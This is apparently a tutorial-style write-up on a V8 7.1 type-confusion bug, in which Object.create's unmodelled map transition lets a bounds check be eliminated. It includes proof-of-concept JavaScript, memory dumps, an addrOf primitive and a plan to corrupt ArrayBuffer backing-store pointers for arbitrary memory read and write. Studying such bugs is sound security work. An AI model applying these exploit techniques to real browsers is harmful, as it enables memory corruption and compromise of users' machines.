Metadata:
- Vuln version (commit 52a9e67): v7.1

As we know, certain operations can have side effects that cause observable changes to the context. For example, if an object that was passed in had its **object Map changed or modified** - that’s an observable **side effect that needs to be written to the chain of operations**. Otherwise, certain optimization passes, such as redundancy elimination, may remove what the compiler believes is a “redundant” `CheckMap` operation when in reality it was a required check. Essentially this can lead to a type confusion vulnerability.

In V8, **each prototype has a unique shape that is not shared** with any other objects, specifically not with other prototypes. Whenever the **prototype of an object is changed, a new shape is allocated for that prototype**.

For the `CreateObject` JavaScript operation, the lowering happens within the `v8/src/compiler/js-generic-lowering.cc` source file, specifically within the `LowerJSCreateObject` function.

```cpp
void JSGenericLowering::LowerJSCreateObject(Node* node) {
  CallDescriptor::Flags flags = FrameStateFlagForCall(node);
  Callable callable = Builtins::CallableFor(
      isolate(), Builtins::kCreateObjectWithoutProperties);
  ReplaceWithStubCall(node, callable, flags);
}
```

The `CreateObjectWithoutProperties` built-in:

```cpp
transitioning builtin CreateObjectWithoutProperties(implicit context: Context)(prototype: JSAny): JSAny {
  try {
    let map: Map;
    let properties: NameDictionary|SwissNameDictionary|EmptyFixedArray;
    typeswitch (prototype) {
      case (Null): {
        map = *NativeContextSlot(
            ContextSlot::SLOW_OBJECT_WITH_NULL_PROTOTYPE_MAP);
        @if(V8_ENABLE_SWISS_NAME_DICTIONARY) {
          properties =
              AllocateSwissNameDictionary(kSwissNameDictionaryInitialCapacity);
        }
        @ifnot(V8_ENABLE_SWISS_NAME_DICTIONARY) {
          properties = AllocateNameDictionary(kNameDictionaryInitialCapacity);
        }
      }
      case (prototype: JSReceiver): {
        properties = kEmptyFixedArray;
        const objectFunction =
            *NativeContextSlot(ContextSlot::OBJECT_FUNCTION_INDEX);
        map = UnsafeCast<Map>(objectFunction.prototype_or_initial_map);
        if (prototype != map.prototype) {
          const prototypeInfo = prototype.map.PrototypeInfo() otherwise Runtime;
          typeswitch (prototypeInfo.object_create_map) {
            case (Undefined): {
              goto Runtime;
            }
            case (weak_map: Weak<Map>): {
              map = WeakToStrong(weak_map) otherwise Runtime;
            }
          }
        }
      }
      case (JSAny): {
        goto Runtime;
      }
    }
    return AllocateJSObjectFromMap(map, properties);
  } label Runtime deferred {
    return runtime::ObjectCreate(prototype, Undefined);
  }
}

// SRC: https://source.chromium.org/chromium/chromium/src/+/main:v8/src/builtins/object.tq
```

The backing store type is dependent on the prototype of the object:
- `Null`: dictionary form
- `JSReceiver`: empty fixed array
- `JSAny`: runtime

There are two final functions that will be called:
- `AllocateJSObjectFromMap`: creates a new object from the given map and properties.
- `runtime::ObjectCreate`: creates a new object from the given prototype.

In the end, the `CreateObjectWithoutProperties` function ends up calling the `ObjectCreate` function, which a C++ runtime builtin located in `v8/src/objects/js-objects.cc`.

```cpp
// 9.1.12 ObjectCreate ( proto [ , internalSlotsList ] )
// Notice: This is NOT 19.1.2.2 Object.create ( O, Properties )
MaybeHandle<JSObject> JSObject::ObjectCreate(Isolate* isolate, Handle<Object> prototype) {
  // Generate the map with the specified {prototype} based on the Object
  // function's initial map from the current native context.
  // TODO(bmeurer): Use a dedicated cache for Object.create; think about
  // slack tracking for Object.create.
  DirectHandle<Map> map =
      Map::GetObjectCreateMap(isolate, Cast<HeapObject>(prototype));

  // Actually allocate the object.
  return isolate->factory()->NewFastOrSlowJSObjectFromMap(map);
}
// SRC: https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/js-objects.cc;l=2383
```

There are two functions:
- `GetObjectCreateMap` is responsible for getting or creating an **prototype object** (not the object itself) and return its Map.
- `NewFastOrSlowJSObjectFromMap` is responsible for creating the **object itself** from the Map of the prototype object.

```cpp
// static
Handle<Map> Map::GetObjectCreateMap(Isolate* isolate,
                                    Handle<HeapObject> prototype) {
  Handle<Map> map(isolate->native_context()->object_function().initial_map(),
                  isolate);
  if (map->prototype() == *prototype) return map;
  if (prototype->IsNull(isolate)) {
    return isolate->slow_object_with_null_prototype_map();
  }
  if (prototype->IsJSObject()) {
    Handle<JSObject> js_prototype = Handle<JSObject>::cast(prototype);
    if (!js_prototype->map().is_prototype_map()) {
      JSObject::OptimizeAsPrototype(js_prototype); // <== Side Effect
    }
    Handle<PrototypeInfo> info =
        Map::GetOrCreatePrototypeInfo(js_prototype, isolate);
    // TODO(verwaest): Use inobject slack tracking for this map.
    if (info->HasObjectCreateMap()) {
      map = handle(info->ObjectCreateMap(), isolate);
    } else {
      map = Map::CopyInitialMap(isolate, map);
      Map::SetPrototype(isolate, map, prototype);
      PrototypeInfo::SetObjectCreateMap(info, map);
    }
    return map;
  }

  return Map::TransitionToPrototype(isolate, map, prototype); // <== Side Effect
}

// SRC: https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/map.cc;l=883?q=GetObjectCreateMap&sq=&ss=chromium%2Fchromium%2Fsrc
```

From the above function, we can see that:
- If the prototype is null (which means the prototype object is `Object.prototype` - the root prototype), we return the slow object with null prototype Map.
- If the prototype is a `JSObject` (which means it is the inherited prototype object of `Object.prototype`), we **convert it into a prototype object**.
- Otherwise, we make a transition from the initial Map to a new Map for updating the prototype.

# Trigger

In this case, if we can get a `CheckMap` operation to be eliminated through redundancy elimination before the call to `Object.create`, then we can trigger a type confusion vulnerability. The type confusion will occur when the engine will try to access the out-of-line properties within the properties backing store. The engine expects the properties backing store to be a `FixedArray` where each property is stored one after another, but instead it will now point to a more complex `NameDictionary`.

The PoC:

```js
function vuln(obj) {
  // Access Property a of obj, forcing a CheckMap operation
  obj.a;

  // Force a Map Transition via our side-effect
  Object.create(obj)

  // Trigger our type-confusion by accessing an out-of-bound property
  return obj.b;
}

vuln({a:42, b:43});
vuln({a:42, b:43});
%OptimizeFunctionOnNextCall(vuln);
vuln({a:42, b:43});
```

Turbo trace of the PoC after typer phase:

![typer-phase](typer-phase.png)

As we can see, the `LoadField` operation has a `CheckMaps` side-effect.

Turbo trace of the PoC after simplified lowering phase:

![simplified-lowering](simplified-lowering.png)

As we can see, the `CheckMaps` operation before `LoadField` of the second property `b` has been eliminated. But, both `LoadField` **still access the backing store with offset**.

This time, let’s add an out-of-line property to our object so that we can **force JIT to access the backing store as an array**, which will trigger our type confusion.

The updated PoC:

```js
function vuln(obj) {
	// Access Property a of obj, forcing a CheckMap operation
	obj.a;

	// Force a Map Transition via our side-effect
	Object.create(obj);

	// Trigger our type-confusion by accessing an out-of-bound property
	return obj.b;
}

function trigger() {
	let obj = { a: 42 }; // Create object with in-line properties
	obj.b = 43; // Store property out-of-line in backing store
	b = vuln(obj); // Trigger type-confusion
	console.log(b);
}

trigger();
trigger();
%OptimizeFunctionOnNextCall(vuln);
trigger();
```

![updated-poc](updated-poc.png)

As we can see:
- Property `a` is **accessed by offset** because it is an inline property before Map transition.
- Property `b` is **accessed by index** because it is an out-of-line property berfore Map transition. The second `LoadField` is for loading the backing store of the property `b` and the third `LoadField` is for loading the property `b` itself.

# Exploit

## Backing store before and after Map transition

Unlike many exploits, this vulnerability does not involve a memory corruption flaw, so it is not possible to overflow a buffer and control the instruction pointer (RIP). However, type confusion vulnerabilities do allow us to manipulate function pointers and data within the memory layout of an object. For instance, if we can overwrite the pointer to an object and V8 dereferences or jumps to that pointer, we can achieve code execution.

The layout of the `NameDictionary` object is as follows:

+------------------------+
|          Map           |
+------------------------+
|         Length         |
+------------------------+
|   Number of Elements   |
+------------------------+
|Number of Deleted Elements|
+------------------------+
|        Capacity        |
+------------------------+
|      Prefix Start      |
+------------------------+
|   Minimum Capacity     |
+------------------------+
|   Descriptor 1 Key     |
+------------------------+
|   Descriptor 1 Value   |
+------------------------+
|  Descriptor 1 Details  |
+------------------------+
|    Descriptor N Key    |
+------------------------+
|  Descriptor N Details  |
+------------------------+
|   Descriptor N Value   |
+------------------------+

The NameDictionary does store the property triplets as well as additional metadata related to the number of elements in the dictionary. In this case, if our type-confusion read the data at offset 16 like in the IR above, then it would have read the number of elements that are stored within the dictionary.

PoC for debugging:

```js
function vuln(obj) {
  // Access Property a of obj, forcing a CheckMap operation
  obj.a;

  // Force a Map Transition via our side-effect
  Object.create(obj)

  // Trigger our type-confusion by accessing an out-of-bound property
  return obj.b;
}

for (let i = 0; i < 10000; i++) {
  let obj = {a:42}; // Create object with in-line properties
  obj.b = 43; // Store property out-of-line in backing store
  if (i = 1) { %DebugPrint(obj); }
  vuln(obj); // Trigger type-confusion
  if (i = 9999) { %DebugPrint(obj); }
}
```

Add breakpoint add `v8::internal::Runtime_DebugPrint`, after that, break on `../../src/runtime/runtime-test.cc:572` and then `next`.

Output:

```shell
DebugPrint: 0x3c80dbc0e429: [JS_OBJECT_TYPE]
 - map: 0x3e8db3b0c9d1 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x3045eb5046d9 <Object map = 0x3e8db3b022f1>
 - elements: 0x120637b82cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x3c80dbc0e4d1 <PropertyArray[3]> {
    #a: 42 (data field 0)
    #b: 43 (data field 1) properties[0]
 }
```

Object's memory:

```shell
gef➤  x/12w 0x3c80dbc0e429 - 1
0x3c80dbc0e428:	0xb3b0c9d1	0x00003e8d	0xdbc0e4d1	0x00003c80
0x3c80dbc0e438:	0x37b82cf1	0x00001206	0x00000000	0x0000002a
0x3c80dbc0e448:	0x37b82341	0x00001206	0x00000000	0x00000005
```

The pointer is in 64-bit form (pointer compression is not implemented at that time).

Where `0x2a = 42` is at offset `24` in the backing store.

Memory of `properties` field:

```shell
gef➤  x/12w 0x3c80dbc0e4d1 - 1
0x3c80dbc0e4d0:	0x37b83899	0x00001206	0x00000000	0x00000003
0x3c80dbc0e4e0:	0x00000000	0x0000002b	0x37b825a1	0x00001206
0x3c80dbc0e4f0:	0x37b825a1	0x00001206	0xbeadbeef	0xdeadbee
```

Where `0x2b = 43` is at offset `16` in the backing store.

Skip to the next `DebugPrint`:

```shell
DebugPrint: 0x3c80dbc0e429: [JS_OBJECT_TYPE]
 - map: 0x3e8db3b0ca71 <Map(HOLEY_ELEMENTS)> [DictionaryProperties]
 - prototype: 0x3045eb5046d9 <Object map = 0x3e8db3b022f1>
 - elements: 0x120637b82cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x3c80dbc0e4f9 <NameDictionary[29]> {
   #a: 42 (data, dict_index: 1, attrs: [WEC])
   #b: 43 (data, dict_index: 2, attrs: [WEC])
 }
```

Object's memory:

```shell
gef➤  x/12w 0x3c80dbc0e429 - 1
0x3c80dbc0e428:	0xb3b0ca71	0x00003e8d	0xdbc0e4f9	0x00003c80
0x3c80dbc0e438:	0x37b82cf1	0x00001206	0x00000000	0x00000000
0x3c80dbc0e448:	0x37b82341	0x00001206	0x00000000	0x0000000
```

The dictionary structure:

```shell
gef➤  x/64w 0x3c80dbc0e4f9 - 1
0x3c80dbc0e4f8:	0x37b83669	0x00001206	0x00000000	0x0000001d
0x3c80dbc0e508:	0x00000000	0x00000002	0x00000000	0x00000000
0x3c80dbc0e518:	0x00000000	0x00000008	0x00000000	0x00000003
0x3c80dbc0e528:	0x00000000	0x00000000	0xeb522c09	0x00003045
0x3c80dbc0e538:	0x00000000	0x0000002a	0x00000000	0x000001c0
0x3c80dbc0e548:	0x37b825a1	0x00001206	0x37b825a1	0x00001206
0x3c80dbc0e558:	0x37b825a1	0x00001206	0x37b825a1	0x00001206
0x3c80dbc0e568:	0x37b825a1	0x00001206	0x37b825a1	0x00001206
0x3c80dbc0e578:	0x37b825a1	0x00001206	0x37b825a1	0x00001206
0x3c80dbc0e588:	0x37b825a1	0x00001206	0xeb522c21	0x00003045
0x3c80dbc0e598:	0x00000000	0x0000002b	0x00000000	0x000002c0
0x3c80dbc0e5a8:	0x37b825a1	0x00001206	0x37b825a1	0x00001206
0x3c80dbc0e5b8:	0x37b825a1	0x00001206	0x37b825a1	0x00001206
0x3c80dbc0e5c8:	0x37b825a1	0x00001206	0x37b825a1	0x00001206
0x3c80dbc0e5d8:	0x37b825a1	0x00001206	0x37b825a1	0x00001206
0x3c80dbc0e5e8:	0x37b825a1	0x00001206	0xb3b0cac1	0x00003e8d
```

As we can see:
- Value of property `a` (`0x2a`) is located at offset `80`.
- Value of property `b` (`0x2b`) is located at offset `160`.

The value after the Map is `0x1d = 29`. This value is the length of the dictionary. After that, we have `0x2 = 2` which is the number of elements in the dictionary.

So, when we access the property `b` at offset `16`, we are actually reading the number of elements in the dictionary.

```shell
d8> %OptimizeFunctionOnNextCall(vuln)
undefined
d8> let obj = {a:42}; obj.b = 43; vuln(obj);
2
```

With two properties, we can only read the number of elements within the dictionary. This doesn’t really provide us much benefit because usually we don’t have much control over this part of the structure as it’s dynamically allocated.

If we can add (80 - 16) / 8 = 8 out-of-line properties, the last property (9th) in the properties array will point to the first property in the dictionary structure. This will allow us to read or write the value of the first property in the dictionary structure.

Example:

```shell
    FixedArray                  NameDictionary
000002c9`f8783899             000002c9`f8783669 
0000000E`00000000             0000013F`00000000
00000001`00000000             0000000B`00000000
00000002`00000000             00000000`00000000
00000003`00000000             00000008`00000000 
00000004`00000000             00000003`00000000
00000005`00000000             00000000`00000000
00000006`00000000             000002c9`f87825a1
00000007`00000000             000002c9`f87825a1
00000008`00000000             000002c9`f87825a1
00000009`00000000   <--!-->   00000001`00000000
0000000A`00000000             000001c0`00000000
```

This means that for every N properties in the `FixedArray`, we will have a handful of overlapping properties within the dictionary that are at the same offset.

## Finding overlapping properties

However, there is a problem with this approach: the layout of the `NameDictionary` will be different in every execution of the engine due to the process-wide randomness used in the hashing mechanism for hash map tables.

```shell
gef➤  x/64w 0x2354cd68e4f9 - 1
0x2354cd68e4f8:	0xe3e83669	0x000032e0	0x00000000	0x0000001d
0x2354cd68e508:	0x00000000	0x00000002	0x00000000	0x00000000
0x2354cd68e518:	0x00000000	0x00000008	0x00000000	0x00000003
0x2354cd68e528:	0x00000000	0x00000000	0xe3e825a1	0x000032e0
0x2354cd68e538:	0xe3e825a1	0x000032e0	0xe3e825a1	0x000032e0
0x2354cd68e548:	0x663a2c09	0x0000397f	0x00000000	0x0000002a
0x2354cd68e558:	0x00000000	0x000001c0	0xe3e825a1	0x000032e0
0x2354cd68e568:	0xe3e825a1	0x000032e0	0xe3e825a1	0x000032e0
0x2354cd68e578:	0xe3e825a1	0x000032e0	0xe3e825a1	0x000032e0
0x2354cd68e588:	0xe3e825a1	0x000032e0	0x663a2c21	0x0000397f
0x2354cd68e598:	0x00000000	0x0000002b	0x00000000	0x000002c0
0x2354cd68e5a8:	0xe3e825a1	0x000032e0	0xe3e825a1	0x000032e0
0x2354cd68e5b8:	0xe3e825a1	0x000032e0	0xe3e825a1	0x000032e0
0x2354cd68e5c8:	0xe3e825a1	0x000032e0	0xe3e825a1	0x000032e0
0x2354cd68e5d8:	0xe3e825a1	0x000032e0	0xe3e825a1	0x000032e0
0x2354cd68e5e8:	0xe3e825a1	0x000032e0	0xaa88cac1	0x000035c3
```

As we can see:
- Value of property `a` (`0x2a`) is located at offset `88`.
- Value of property `b` (`0x2b`) is located at offset `160`.

Although the properties are not in a known or even guessable order, we still know that there likely exists a pair of properties P1 and P2 that will eventually overlap at the same offset. If we can write a JavaScript function to find these overlapping properties, we will at least be able to gain some precision in reading and writing new values to our properties.

Before writing this function, we need to consider how many properties we should generate in order to find this overlap. Well, due to in-object slack tracking the optimal number of fast properties is 32, so we will use that as our maximum.

```js
function makeObj() {
    let obj = {inline: 1234};
    for (let i = 1; i < 32; i++) {
        Object.defineProperty(obj, 'p' + i, {
            writable: true,
            value: -i
        });
    }
    return obj;
}
```

One thing to note within the function is that we are using a negative value for i. The reason for this is that there are a few unrelated small positive values in the dictionary, such as the length and number of elements. If we use positive values for our property values, there is a risk of getting false positives when searching for overlapping properties. Therefore, we use negative numbers to distinguish our properties from these unrelated values. 

From here we can start writing our function that will search for overlapped properties. One modification we will make is to our vuln function, which previously triggered the bug and returned property `b` of the object. In this case, we want to return the values of all properties so that we can compare them between the array and dictionary.

Output of the new updated PoC:

```shell
[+] Finding Overlapping Properties
-1,     -2,     -3,     -4,     -5,     -6,     -7,     -8,     -9,     -10,    -11,    -12,    -13,    -14,    -15,    -16,    -17,    -18,    -19,    -20,    -21,    -22,    -23,    -24,     -25,    -26,    -27,    -28,    -29,    -30,    -31
32,     0,      64,     33,     0,      ,       ,       ,       p30,    -30,    8176,   ,       ,       ,       p9,     -9,     2800,   p6,     -6,     2032,   ,       ,       ,       p19,     -19,    5360,   ,       ,       ,       p17,    -17
```

As we can see, there are some overlapping properties:
- P10 of FixedArray and P30 of NameDictionary
- P16 of FixedArray and P9 of NameDictionary
- P19 of FixedArray and P6 of NameDictionary
- P25 of FixedArray and P19 of NameDictionary
- P31 of FixedArray and P17 of NameDictionary

Now that we have confirmed that this code works and we have overlapping properties, we can modify the script to enumerate through the results and choose an overlapping property whose value is less than 0 and greater than -32. Also, let’s remove properties that overlap themselves.

```shell
[+] Finding Overlapping Properties
[+] Properties p7 and p1 overlap!
```

## Understanding Browser Exploit Primitives

To those with a keen eye, you might have noticed that currently we only can read SMI’s and strings. In essence, just reading integers or strings is useless, we need to find a way to read and write memory pointers.

**The overlapping indexes are remained in one instance of V8**. This means that we can use the same indexes to read and write memory pointers.

To help us accomplish that, we need to construct a read and write exploit primitive known as the `addrOf` and `fakeObj` primitive, respectively. These primitives will allow us to exploit our overlapping properties by confusing an object of one type with an object of another type.

```js
function addrOf() {
  eval(`
    function vuln(obj) {
      obj.inline;
      this.Object.create(obj);
      return obj.p${p1}.x;
    }
  `);

  let objThatNeedToBeLeaked = {z: 1234};

  // Values that will be confused
  let pValues = [];
  pValues[p1] = {x: 13.37}; // accessed as float
  pValues[p2] = {y: objThatNeedToBeLeaked}; // accessed as JSObject and will be accessed as float <-- still don't get why the shape must be different.

  // Use loop for kicking off the JIT
  for (let i = 0; i < 10000; i++) {
      let obj = makeObj(pValues);
      let res = vuln(obj);
      if (res != 13.37) {
          %DebugPrint(obj);
          return res;
      }
  }
}
```

As you can see, we set `p1` as a double with the value of `13.37` and we set `y` as the object that we want to leak After triggering the vulnerability through the `vuln` function, the engine will assume that the value returned to us by `obj.p1.x` will be a `double`, but instead it will load the pointer to our `p2` object and return it as a double.

So, at the moment, we have two kind of type confusion:
- The first kind that we triggered is between a `FixedArray` and a `NameDictionary`. This kind used to help us find a way to read and write memory of the back storage after Map transition. Why do we need the Map transition again? The answer is we need it to eliminate the `CheckMaps` (specifically on property `x`) that could deoptimize the operation on some fixed indexed/offset properties which we need it to be remained.
- The second kind that we will trigger is between two different arbitrary objects. This way, we can store one kind of data into buffer and then read the other kind of data from the buffer at the same offset with the same manner. For example, we store the value in buffer as float with a float pointer. Later than, that pointer will point to the memory address of an object and hence we can dereference that pointer as float for getting the address.

From here, there is just one slight modification that needs to be made for our `addrOf` function. We have to make sure we subtract `1n` from the `BigUint64Array` to account for pointer tagging if we want to use this address further in the script.

## Gaining Memory Read + Write

To achieve something useful with our read and write primitives, we need to overwrite an internal field of an object, such as the backing store pointer, rather than an actual object or property within the backing store. As you know, the backing store pointer stores a memory address that tells V8 where our property or element array is located. If we can overwrite this pointer, we can tell V8 to access specific elements anywhere in memory via our bug!

The next thing we have to consider for this exploit is to decide on what type of object we want to use when corrupting the backing store pointer. Sure, we can use a simple object with out-of-line properties, but in our case, and for most browser exploits, we’ll actually utilize an `ArrayBuffer` object.

The reason we use an `ArrayBuffer` over a normal object is because these array buffers are used to **represent a fixed-length raw binary data buffer**. One important thing to note is that we cannot directly manipulate the contents of an `ArrayBuffer` in JavaScript. Instead, we must use a `TypedArray` or a `DataView` object with a specific data representation format, and use that to read and write the contents of the buffer.

```shell
V8 version 7.1.0 (candidate)
d8> var buffer = new ArrayBuffer(8)
undefined

d8> var view = new Uint8Array(buffer)
undefined

d8> %DebugPrint(buffer)
DebugPrint: 0x23ae63a8e151: [JSArrayBuffer]
 - map: 0x36edd4004371 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x2fc643e10fd1 <Object map = 0x36edd40043c1>
 - elements: 0x3ed7de102cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - embedder fields: 2
 - backing_store: 0x62b283a88250
 - byte_length: 8
 - neuterable
 - properties: 0x3ed7de102cf1 <FixedArray[0]> {}
 - embedder fields = {
    (nil)
    (nil)
 }
```

The backing store pointer is at offset `32` of the `ArrayBuffer`:

```shell
gef➤  x/10x 0x23ae63a8e151
0x23ae63a8e151:	0xedd40043	0xf1000036	0xd7de102c	0xf100003e
0x23ae63a8e161:	0xd7de102c	0x0800003e	0x00000000	0x50000000
0x23ae63a8e171:	0xb283a882	0x0200006
```

And the `view` object will have a pointer to that backing store:

```shell
d8> %DebugPrint(view)
DebugPrint: 0x23ae63a90061: [JSTypedArray]
 - map: 0x36edd4002b11 <Map(UINT8_ELEMENTS)> [FastProperties]
 - prototype: 0x2fc643e07e91 <Object map = 0x36edd4002b61>
 - elements: 0x23ae63a900a9 <FixedUint8Array[8]> [UINT8_ELEMENTS]
 - embedder fields: 2
 - buffer: 0x23ae63a8e151 <ArrayBuffer map = 0x36edd4004371> <-- point to the address of ArrayBuffer
 - byte_offset: 0
 - byte_length: 8 <-- inherit from ArrayBuffer so it know how much of data it can read/write
 - length: 8
 - properties: 0x3ed7de102cf1 <FixedArray[0]> {}
 - elements: 0x23ae63a900a9 <FixedUint8Array[8]> {
         0-7: 0
 }
 - embedder fields = {
    (nil)
    (nil)
 }
```

Add two more elements to the backing store and inspect the memory:

```shell
d8> view[0] = 65
65
d8> view[2] = 66
66
```

We do not subtract 1 from the pointer since unlike other object backing stores, an ArrayBuffer backing store is actually a 64-bit pointer!

```shell
gef➤  x/32x 0x62b283a88250
0x62b283a88250:	0x00420041	0x00000000	0x00000000	0x00000000
0x62b283a88260:	0x00000000	0x00000000	0x000000a1	0x00000000
0x62b283a88270:	0x83a710b0	0x000062b2	0x83a710b0	0x000062b2
0x62b283a88280:	0x00000001	0x00000000	0x83a88310	0x000062b2
0x62b283a88290:	0x83a710b0	0x000062b2	0x00000001	0x00000000
0x62b283a882a0:	0x83a88330	0x000062b2	0x83a710b0	0x000062b2
0x62b283a882b0:	0x00000001	0x00000000	0x83a88350	0x000062b2
0x62b283a882c0:	0x83a710b0	0x000062b2	0x00000002	0x00000000
```

The value `0x00420041` is `0x41 = 65` and `0x42 = 66` from the right.

In the vuln function we attempt to overwrite property `x` for our `p1` object. This would dereference the object address for `p1` and access offset 24, where our `x` property value is stored in-line. However, due to the type confusion, this operation will actually dereference the object address of `p2` and access offset `24`, where the `y` property value is stored in-line, which would allow us to overwrite the address of the obj object.

![](access-property-through-overlapping.png)

We know that the backing store pointer for our array buffer is at offset 32, meaning that if we create another in-line property such as `x2`, then we should be able to access and overwrite that backing store pointer via our `fakeObj` primitive!

![](access-back-pointer-through-overlapping.png)

To minimize the number of times we have to use the `fakeObj` primitive to overwrite the backing store, we can use two array buffers objects instead of one! This way, we can corrupt the backing store pointer of our first array buffer and point it to our second array buffer object’s address.

Once that is completed, we can use a `TypedArray` view of our first array buffer to write to the 5th object property (4th index, i.e. `view1[4]`), which will overwrite the backing store pointer of the second array buffer. From there, we can use a `TypedArray` view of the second array buffer to read and write data to/from the pointed memory region!

![alt text](two-array-buffer.png)